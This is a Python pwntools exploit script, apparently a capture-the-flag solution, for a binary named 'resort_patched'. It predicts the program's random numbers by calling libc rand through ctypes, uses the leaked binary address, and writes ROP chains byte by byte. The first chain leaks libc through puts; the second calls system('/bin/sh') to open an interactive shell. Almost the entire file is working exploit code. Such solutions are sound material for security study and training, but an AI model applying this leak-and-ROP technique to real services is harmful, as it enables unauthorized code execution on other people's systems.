from pwn import *

# randio = process('./randoracle_patched')
# def get_rand():
#   return int(randio.recvline(keepends=False), 10)

import ctypes
libc_io = ctypes.CDLL('./libc.so.6')
rand = libc_io['rand']
rand.restype = ctypes.c_int
def get_rand():
  if rand() % 4 == 3:
    return -1
  return rand() % 255

e = context.binary = ELF('./resort_patched')
libc = ELF('./libc.so.6')

io = process()

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

gdbscript='''
# b *($base("") + 0x179D)
c
'''

if args.GDB:
  gdb.attach(io, gdbscript=gdbscript)
elif args.REMOTE:
  io = remote('localhost', 5000)

io.recvuntil(b'r2uwu2 @ 0x')
e.address = int(io.recvuntil(b' ', drop=True), 16) - e.sym['print_ui']
print(f'e: {hex(e.address)}')

def end_game():
  while True:
    if get_rand() == -1:
      io.sendlineafter(b'> ', b'1')
      break
    else:
      io.sendlineafter(b'> ', b'0')

  while True:
    if get_rand() == -1:
      io.sendlineafter(b'> ', b'2')
      break
    else:
      io.sendlineafter(b'> ', b'0')

  while True:
    if get_rand() == -1:
      io.sendlineafter(b'> ', b'3')
      break
    else:
      io.sendlineafter(b'> ', b'0')

def clear_byte(off):
  while True:
    if (get_rand() != -1):
      io.sendlineafter(b'> ', b'0')
    else:
      io.sendlineafter(b'> ', str(off).encode())
      break

def set_byte(off, val):
  # must be cleared first
  cur = 0
  while cur != val:
    oo = get_rand()
    if (oo == -1):
      assert(b'DOM CLOBBERING' in io.recvuntil(b'against'))
      io.sendlineafter(b'> ', b'0')
    else:
      cur = (cur - oo + 0x100) & 0xff
      io.sendlineafter(b'> ', str(off).encode())

def set_chain(off, val):
  for i in range(len(val)):
    clear_byte(off + i)
    set_byte(off + i, val[i])

rop_off = 0x78 - 0xc + 1
nop = libc.address + 0x378df

# leak libc
set_chain(rop_off, p64(e.address + 0x179b) + p64(e.got['puts']) + p64(0) + p64(e.plt['puts']) + p64(e.address + 0x179b) + p64(0) + p64(1) + p64(e.sym['main']))
end_game()
io.recvline()

libc.address = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['puts']
print(f'libc: {hex(libc.address)}')

# CURRENT PROBLEM
# clear_byte work incorrectly after ret2main
# SOLVED: because my end_game() is incorrect, I should also do -1 on each of them, no subtract until 0

pop_rdi = libc.address + 0x2a3e5
pop_rsi = libc.address + 0x2be51
pop_rdx_r12 = libc.address + 0x11f357

set_chain(rop_off, p64(pop_rdx_r12) + p64(0) + p64(0) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(pop_rsi) + p64(0) + p64(libc.sym['system']+4))
end_game()

io.interactive()